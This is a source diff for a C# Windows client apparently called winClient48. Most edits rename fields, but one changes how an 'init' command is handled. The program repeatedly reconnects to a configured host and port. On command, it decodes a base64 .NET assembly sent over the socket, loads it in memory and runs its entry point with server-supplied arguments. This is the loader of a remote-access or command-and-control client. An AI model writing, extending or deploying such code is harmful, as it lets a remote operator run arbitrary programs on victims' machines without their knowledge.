@@ -37,14 +37,14 @@ namespace winClient48
 {
     public partial class Form1 : Form
     {
-        private Socket g_Socket;
-        private bool g_bConnected = false;
+        private Socket m_Socket;
+        private bool m_bConnected = false;
 
-        private string g_szIPAddr = "127.0.0.1";
-        private int g_nPort = 5000;
+        private string m_szIPAddr = "127.0.0.1";
+        private int m_nPort = 5000;
 
-        private int g_nTimeout = 10000; //ms
-        private int g_nRetry = 10000; //ms
+        private int m_nTimeout = 10000; //ms
+        private int m_nRetry = 10000; //ms
 
         public Form1()
         {
@@ -148,11 +148,11 @@ namespace winClient48
                         }
                     }
                 }
-                while (recv_len > 0 && g_bConnected);
+                while (recv_len > 0 && m_bConnected);
             }
             catch (Exception ex)
             {
-                g_bConnected = false;
+                m_bConnected = false;
                 return;
             }
         }
@@ -178,7 +178,8 @@ namespace winClient48
             }
             else if (aCmd[0] == "init")
             {
-                byte[] abExeBytes = Convert.FromBase64String(aCmd[1]);
+                string[] aszData = clsEZData.fnStrToListStr(aCmd[1]).ToArray();
+                byte[] abExeBytes = Convert.FromBase64String(aCmd[2]);
 
                 Assembly loaded = Assembly.Load(abExeBytes);
                 MethodInfo entry = loaded.EntryPoint;
@@ -186,7 +187,7 @@ namespace winClient48
                 if (!entry.IsStatic)
                     instance = loaded.CreateInstance(entry.Name);
 
-                entry.Invoke(instance, new object[] { new string[] { } });
+                entry.Invoke(instance, new object[] { aszData });
 
                 s.socket.Close();
             }
@@ -206,14 +207,14 @@ namespace winClient48
             try
             {
                 Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                sock.ReceiveTimeout = sock.SendTimeout = g_nTimeout;
+                sock.ReceiveTimeout = sock.SendTimeout = m_nTimeout;
                 sock.Connect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort));
 
                 Server s = new Server(sock);
                 new Thread(() => ReceivedBuffer(s)).Start();
-                g_bConnected = true;
+                m_bConnected = true;
 
-                g_Socket = sock;
+                m_Socket = sock;
 
                 return true;
             }
@@ -225,17 +226,17 @@ namespace winClient48
 
         void Main()
         {
-            g_bConnected = false;
+            m_bConnected = false;
             new Thread(() =>
             {
                 while (true)
                 {
-                    if (!g_bConnected)
+                    if (!m_bConnected)
                     {
-                        g_bConnected = Connect(g_szIPAddr, g_nPort);
+                        m_bConnected = Connect(m_szIPAddr, m_nPort);
                     }
 
-                    Thread.Sleep(g_nRetry);
+                    Thread.Sleep(m_nRetry);
                 }
             }).Start();
         }
